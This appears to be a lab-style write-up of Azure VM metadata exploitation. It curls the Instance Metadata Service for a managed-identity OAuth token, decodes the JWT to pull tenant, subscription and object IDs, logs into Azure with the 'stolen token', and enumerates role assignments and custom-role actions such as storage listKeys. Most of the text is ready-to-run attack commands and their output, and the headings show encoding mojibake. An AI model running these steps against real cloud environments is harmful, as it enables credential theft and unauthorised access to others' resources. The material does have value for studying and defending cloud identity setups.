# ğŸ” Azure VM Metadata Exploitation Report

### âš™ï¸ 1. Accessing Azure Instance Metadata Service (IMDS)

#### ğŸ“¥ Metadata Endpoint Call

The following cURL command is used to interact with the VM metadata endpoint:

```bash
curl -H "Metadata:true" \
"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

* `Metadata:true`: Required header for Azure metadata API.
* The `resource` parameter specifies the intended audience (Azure Management API).

#### âœ… Response Output (JWT Token):

```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIn...",
  "expires_in": "3599",
  "expires_on": "1736559249",
  "not_before": "1736472549",
  "resource": "https://management.azure.com/",
  "token_type": "Bearer"
}
```

***

### ğŸ” 2. Decoding the JWT Token

Paste the token into [https://jwt.io](https://jwt.io/) to decode it and extract useful metadata.

#### ğŸ§¾ Extracted Claims:

```json
"iss": "https://sts.windows.net/143198c4-77be-42f7-b18e-95c5b693e6b9/"
"sub": "86ca3955-6c7e-48d5-9e8d-b6b1d173c8c0"
"xms_mirid": "/subscriptions/5fa84b56-df67-4e4e-830c-xxxxxxxxxxxx/resourceGroups/IT-RG/providers/Microsoft.Compute/virtualMachines/it-vm"
```

* **Issuer (iss)**: Tenant ID URL.
* **sub**: Object ID of the managed identity.
* **xms\_mirid**: Contains subscription ID, resource group, and VM name.

***

### ğŸ” 3. Extracting Important Identifiers

| Key              | Value                                                    |
| ---------------- | -------------------------------------------------------- |
| **Tenant ID**    | `143198c4-77be-42f7-b18e-95c5b693e6b9`                   |
| **Subscription** | `5fa84b56-df67-4e4e-830c-xxxxxxxxxxxx` (from xms\_mirid) |
| **Object ID**    | `86ca3955-6c7e-48d5-9e8d-b6b1d173c8c0` (from `sub`)      |

***

### ğŸ”— 4. Azure Login using Access Token (PowerShell)

```powershell
Connect-AzAccount -AccessToken "<access_token>" -AccountId "<tenant_id>"
```

* This command logs you into Azure using the stolen token.
* You must have `Az.Accounts` module installed.

***

### ğŸ—ƒï¸ 5. Listing Role Assignments of Managed Identity

#### ğŸ”¹ Azure CLI:

```bash
az role assignment list \
  --assignee 86ca3955-6c7e-48d5-9e8d-b6b1d173c8c0 \
  --all \
  --query "[?scope=='/subscriptions/5fa84b56-df67-4e4e-830c-xxxxxxxxxxxx'].[roleDefinitionName, scope]" \
  --output table
```

#### ğŸ”¹ PowerShell Equivalent:

```python
Get-AzRoleAssignment -ObjectId 86ca3955-6c7e-48d5-9e8d-b6b1d173c8c0 |
Where-Object { $_.Scope -like "/subscriptions/*" } |
Select-Object RoleDefinitionName, Scope
```

#### ğŸ“‹ Output:

```plaintext
RoleDefinitionName          Scope
--------------------------  ---------------------------------------------------
Reader                      /subscriptions/5fa84b56-df67-4e4e-830c-xxxxxxxxxxxx
custom-role-definition      /subscriptions/5fa84b56-df67-4e4e-830c-xxxxxxxxxxxx
```

âœ… Thus, the VMâ€™s managed identity has the following **subscription-level roles**:

* `Reader`
* `custom-role-definition`

***

### ğŸ”“ 6. Discover Actions in custom-role-definition

#### ğŸ”¹ Azure CLI:

```bash
az role definition list \
  --name "custom-role-definition" \
  --query "[].permissions[].actions" \
  --output table
```

#### Example Output:

```plaintext
Actions
----------------------------------------------------------
Microsoft.Compute/virtualMachines/read
Microsoft.KeyVault/vaults/read
Microsoft.Storage/storageAccounts/listKeys/action
...
```
